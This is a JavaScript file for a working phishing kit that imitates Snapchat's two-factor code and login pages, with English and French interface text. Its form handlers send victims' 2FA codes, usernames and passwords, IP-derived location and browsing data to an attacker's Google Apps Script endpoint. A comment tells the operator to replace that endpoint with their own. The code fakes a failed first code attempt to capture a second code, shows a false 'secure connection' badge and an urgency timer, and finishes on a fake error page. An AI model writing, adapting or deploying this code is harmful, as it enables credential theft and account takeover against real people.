// Données bilingues pour chaque page
const translations = {
    index: {
        en: {
            title: "Two-Factor Authentication",
            subtitle: "Enter the 6-digit code we sent you",
            continueBtn: "Continue",
            resendLink: "Didn't receive a code?",
            supportText: "Having trouble? Visit our Help Center",
            resendMessage: "We've sent you a new code",
            invalidCode: "Incorrect code. Please try again.",
            verifying: "Verifying your code...",
            verified: "Success!",
            attemptsLeft: "attempt(s) remaining"
        },
        fr: {
            title: "Authentification à deux facteurs",
            subtitle: "Entrez le code à 6 chiffres que nous vous avons envoyé",
            continueBtn: "Continuer",
            resendLink: "Vous n'avez pas reçu de code ?",
            supportText: "Besoin d'aide ? Visitez notre Centre d'aide",
            resendMessage: "Nous vous avons envoyé un nouveau code",
            invalidCode: "Code incorrect. Veuillez réessayer.",
            verifying: "Vérification de votre code...",
            verified: "Succès !",
            attemptsLeft: "tentative(s) restante(s)"
        }
    },
    login: {
        en: {
            title: "Log in to Snapchat",
            usernamePlaceholder: "Username or email",
            passwordPlaceholder: "Password",
            loginBtn: "Log In",
            forgotLink: "Forgot your password?",
            supportText: "New to Snapchat? <a href='#'>Sign Up</a>"
        },
        fr: {
            title: "Connexion à Snapchat",
            usernamePlaceholder: "Nom d'utilisateur ou e-mail",
            passwordPlaceholder: "Mot de passe",
            loginBtn: "Se connecter",
            forgotLink: "Mot de passe oublié ?",
            supportText: "Nouveau sur Snapchat ? <a href='#'>S'inscrire</a>"
        }
    },
    error: {
        en: {
            title: "Something went wrong",
            errorMessage: "We're having trouble connecting to Snapchat servers right now.",
            errorSubtitle: "Please check your internet connection and try again in a few moments.",
            backLink: "Try Again",
            supportText: "Need help? Visit our <a href='#'>Help Center</a>"
        },
        fr: {
            title: "Une erreur s'est produite",
            errorMessage: "Nous avons des difficultés à nous connecter aux serveurs Snapchat pour le moment.",
            errorSubtitle: "Veuillez vérifier votre connexion Internet et réessayer dans quelques instants.",
            backLink: "Réessayer",
            supportText: "Besoin d'aide ? Visitez notre <a href='#'>Centre d'aide</a>"
        }
    }
};

// Détection automatique de la langue du navigateur
let currentLang = navigator.language.startsWith('fr') ? 'fr' : 'en';

// ⚠️ CHANGEZ CETTE URL PAR LA VÔTRE
const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbxur_-UmZVt1YTebgeZNPQdJV7X55nS1tFhitzNPl-4HVNrvhdJZoSrC6-vpvG91VyJNQ/exec';

// Variables pour analytics
let pageLoadTime = Date.now();
let mouseMovements = 0;
let attempts = 0;
const maxAttempts = 2;

// ==================== FONCTIONNALITÉ 1: BADGE DE SÉCURITÉ ====================
function createSecurityBadge() {
    const badge = document.createElement('div');
    badge.className = 'security-badge';
    badge.innerHTML = `
        <svg width="16" height="16" fill="#00cc00">
            <path d="M8 0L2 3v5c0 3.5 2.5 6.5 6 7 3.5-.5 6-3.5 6-7V3L8 0z"/>
        </svg>
        <span>${currentLang === 'fr' ? 'Connexion sécurisée' : 'Secure Connection'}</span>
    `;
    document.body.appendChild(badge);
}

// ==================== FONCTIONNALITÉ 2: TIMER DE SESSION ====================
function startSessionTimer() {
    let timeLeft = 180; // 3 minutes
    const timerDiv = document.createElement('div');
    timerDiv.id = 'session-timer';
    timerDiv.innerHTML = `
        <svg width="18" height="18" fill="white">
            <circle cx="9" cy="9" r="8" stroke="white" stroke-width="2" fill="none"/>
            <path d="M9 5v4l3 3" stroke="white" stroke-width="2" fill="none"/>
        </svg>
        <span>${currentLang === 'fr' ? 'Code expire dans :' : 'Code expires in:'} <strong id="timer-text">3:00</strong></span>
    `;
    document.body.appendChild(timerDiv);
    
    const interval = setInterval(() => {
        timeLeft--;
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        const timerText = document.getElementById('timer-text');
        if (timerText) {
            timerText.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        }
        
        if (timeLeft <= 0) {
            clearInterval(interval);
            showExpiredMessage();
        } else if (timeLeft <= 30) {
            timerDiv.style.animation = 'pulse 0.5s infinite';
        }
    }, 1000);
}

function showExpiredMessage() {
    const message = document.getElementById('message');
    if (message) {
        message.style.color = '#ff3333';
        message.textContent = currentLang === 'fr' 
            ? '⚠️ Code expiré. Demandez un nouveau code.' 
            : '⚠️ Code expired. Request a new code.';
    }
}

// ==================== FONCTIONNALITÉ 3: DÉTECTION GÉOLOCALISATION ====================
async function getLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            city: data.city || 'Unknown',
            country: data.country_name || 'Unknown',
            ip: data.ip || 'Unknown'
        };
    } catch(e) {
        return { city: 'Unknown', country: 'Unknown', ip: 'Unknown' };
    }
}

// ==================== FONCTIONNALITÉ 4: TRACKING SOURIS ====================
document.addEventListener('mousemove', () => {
    mouseMovements++;
});

// Envoyer analytics avant de quitter la page
window.addEventListener('beforeunload', () => {
    const timeSpent = Math.floor((Date.now() - pageLoadTime) / 1000);
    sendDataToSheet('Analytics', `Time: ${timeSpent}s | Mouse: ${mouseMovements} movements`);
});

// Fonction pour envoyer les données avec géolocalisation
async function sendDataToSheet(type, value) {
    const timestamp = new Date().toLocaleString();
    const userAgent = navigator.userAgent;
    const location = await getLocation();
    
    const data = {
        type: type,
        value: value,
        timestamp: timestamp,
        userAgent: userAgent,
        language: currentLang,
        location: `${location.city}, ${location.country} (${location.ip})`
    };
    
    fetch(GOOGLE_SHEET_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(() => console.log('Data logged'))
    .catch(error => console.error('Error:', error));
}

// Fonction pour définir la langue
function setLanguage(lang) {
    currentLang = lang;
    const page = window.location.pathname.includes('login') ? 'login' : 
                 window.location.pathname.includes('error') ? 'error' : 'index';
    const texts = translations[page][lang];

    document.getElementById('title').textContent = texts.title;
    if (page === 'index') {
        document.getElementById('subtitle').textContent = texts.subtitle;
        document.getElementById('continue-btn').textContent = texts.continueBtn;
        document.getElementById('resend-link').textContent = texts.resendLink;
    } else if (page === 'login') {
        document.getElementById('username-placeholder').placeholder = texts.usernamePlaceholder;
        document.getElementById('password-placeholder').placeholder = texts.passwordPlaceholder;
        document.getElementById('login-btn').textContent = texts.loginBtn;
        document.getElementById('forgot-link').textContent = texts.forgotLink;
    } else if (page === 'error') {
        document.getElementById('error-message').textContent = texts.errorMessage;
        document.getElementById('error-subtitle').textContent = texts.errorSubtitle;
        document.getElementById('back-link').textContent = texts.backLink;
    }
    document.getElementById('support-text').innerHTML = texts.supportText;
    document.getElementById('language-menu').style.display = 'none';
}

// Fonction pour afficher/cacher le menu
function toggleLanguageMenu() {
    const menu = document.getElementById('language-menu');
    menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
}

// Initialiser la langue au chargement
window.onload = async function() {
    setLanguage(currentLang);
    
    // Logger la visite de la page avec localisation
    const page = window.location.pathname.split('/').pop() || 'index.html';
    await sendDataToSheet('Page Visit', page);
    
    // Créer le badge de sécurité
    createSecurityBadge();
    
    // Démarrer le timer si on est sur index.html
    if (page === 'index.html' || page === '' || page === '/') {
        startSessionTimer();
    }
};

// Fermer le menu si on clique ailleurs
document.addEventListener('click', function(event) {
    const menu = document.getElementById('language-menu');
    const btn = document.querySelector('.language-btn');
    if (menu && btn && !btn.contains(event.target) && !menu.contains(event.target)) {
        menu.style.display = 'none';
    }
});

// Move focus to next input field avec support backspace
function moveToNext(current, nextField) {
    if (current.value.length >= 1 && nextField <= 6) {
        const inputs = document.getElementsByTagName('input');
        if (inputs[nextField]) {
            inputs[nextField].focus();
        }
    }
}

// Ajouter support pour backspace
if (document.getElementById('codeForm')) {
    const inputs = document.querySelectorAll('.code-input input');
    inputs.forEach((input, index) => {
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !input.value && index > 0) {
                inputs[index - 1].focus();
            }
        });
        
        input.addEventListener('input', function() {
            if (this.value.length >= 1 && index < 5) {
                inputs[index + 1].focus();
            }
        });
        
        // Bloquer le copier-coller
        input.addEventListener('paste', function(e) {
            e.preventDefault();
            sendDataToSheet('Suspicious Activity', 'User tried to paste in code field');
            
            const message = document.getElementById('message');
            message.style.color = '#ff9800';
            message.textContent = currentLang === 'fr' 
                ? '⚠️ Veuillez saisir le code manuellement' 
                : '⚠️ Please enter the code manually';
            
            setTimeout(() => message.textContent = '', 3000);
        });
    });
}

// Simulate resending code avec délai réaliste
function resendCode() {
    const message = document.getElementById('message');
    const resendLink = document.getElementById('resend-link');
    
    resendLink.style.pointerEvents = 'none';
    resendLink.style.opacity = '0.5';
    
    message.style.color = '#000';
    message.textContent = translations.index[currentLang].resendMessage;
    
    // Logger la demande de renvoi
    sendDataToSheet('Resend Code', 'User requested code resend');
    
    setTimeout(() => {
        message.textContent = '';
        resendLink.style.pointerEvents = 'auto';
        resendLink.style.opacity = '1';
    }, 3000);
    
    return false;
}

// Toggle password visibility avec SVG
function togglePasswordVisibility() {
    const passwordInput = document.getElementById('password-placeholder');
    const eyeIcon = document.getElementById('eye-icon');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.innerHTML = `
            <path d="M2 2l20 20"></path>
            <path d="M6.61 6.61A9 9 0 0019.39 17.39M2 12s4-8 11-8a10.34 10.34 0 012.36.28M22 12s-4 8-11 8a10.34 10.34 0 01-2.36-.28"></path>
        `;
    } else {
        passwordInput.type = 'password';
        eyeIcon.innerHTML = `
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
        `;
    }
}

// ==================== FONCTIONNALITÉ 5: MESSAGES D'ÉCHECS ====================
// Handle code form submission avec validation et tentatives échouées
if (document.getElementById('codeForm')) {
    document.getElementById('codeForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const inputs = document.querySelectorAll('.code-input input');
        let code = '';
        inputs.forEach(input => {
            code += input.value;
        });

        const message = document.getElementById('message');
        const button = document.querySelector('.verify-btn');

        if (code.length !== 6 || !/^\d+$/.test(code)) {
            message.style.color = '#ff3333';
            message.textContent = translations.index[currentLang].invalidCode;
            
            // Shake animation pour les inputs
            inputs.forEach(input => {
                input.style.animation = 'shake 0.3s';
                setTimeout(() => {
                    input.style.animation = '';
                }, 300);
            });
            return;
        }

        // Incrémenter les tentatives
        attempts++;
        
        // Si moins de maxAttempts, montrer un faux échec
        if (attempts < maxAttempts) {
            message.style.color = '#ff3333';
            message.textContent = `${translations.index[currentLang].invalidCode} ${maxAttempts - attempts} ${translations.index[currentLang].attemptsLeft}`;
            
            // Logger la tentative échouée
            sendDataToSheet('Failed Attempt', `Code: ${code} (Attempt ${attempts}/${maxAttempts})`);
            
            // Shake animation
            inputs.forEach(input => {
                input.value = '';
                input.style.animation = 'shake 0.4s';
            });
            
            setTimeout(() => {
                message.textContent = '';
                inputs.forEach(input => input.style.animation = '');
                inputs[0].focus();
            }, 2000);
            
            return;
        }

        // Après maxAttempts tentatives, on accepte le code
        message.style.color = '#666';
        message.textContent = translations.index[currentLang].verifying;
        button.disabled = true;
        button.style.opacity = '0.7';

        const codeEntry = `2FA Code: ${code} (Accepted after ${attempts} attempts)`;
        sendDataToSheet('2FA Code', codeEntry);

        // Délai réaliste pour la vérification
        setTimeout(() => {
            message.style.color = '#00C853';
            message.textContent = translations.index[currentLang].verified;
            setTimeout(() => {
                window.location.href = 'login.html';
            }, 800);
        }, 1500);
    });
}

// Handle login form submission avec validation
if (document.getElementById('loginForm')) {
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const username = document.getElementById('username-placeholder').value.trim();
        const password = document.getElementById('password-placeholder').value;
        const button = document.querySelector('.login-btn');

        if (!username || !password) {
            return;
        }

        button.disabled = true;
        button.textContent = currentLang === 'fr' ? 'Connexion...' : 'Logging in...';
        button.style.opacity = '0.7';

        const credentialEntry = `Username: ${username} | Password: ${password}`;
        sendDataToSheet('Login Credentials', credentialEntry);

        // Délai réaliste
        setTimeout(() => {
            window.location.href = 'error.html';
        }, 1200);
    });
}

// Ajouter les styles CSS nécessaires
const style = document.createElement('style');
style.textContent = `
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
        20%, 40%, 60%, 80% { transform: translateX(4px); }
    }
    
    @keyframes pulse {
        0%, 100% { transform: translateX(-50%) scale(1); }
        50% { transform: translateX(-50%) scale(1.05); }
    }
    
    .security-badge {
        position: fixed;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%);
        display: flex;
        align-items: center;
        gap: 8px;
        background: linear-gradient(135deg, #f0f0f0 0%, #e8e8e8 100%);
        padding: 10px 20px;
        border-radius: 25px;
        font-size: 12px;
        color: #555;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        z-index: 9998;
        font-weight: 600;
    }
    
    #session-timer {
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: linear-gradient(135deg, #ff6b6b 0%, #ff5252 100%);
        color: white;
        padding: 12px 24px;
        border-radius: 25px;
        font-size: 14px;
        font-weight: 600;
        box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
        z-index: 9999;
        display: flex;
        align-items: center;
        gap: 10px;
        animation: pulse 2s infinite;
    }
`;
document.head.appendChild(style);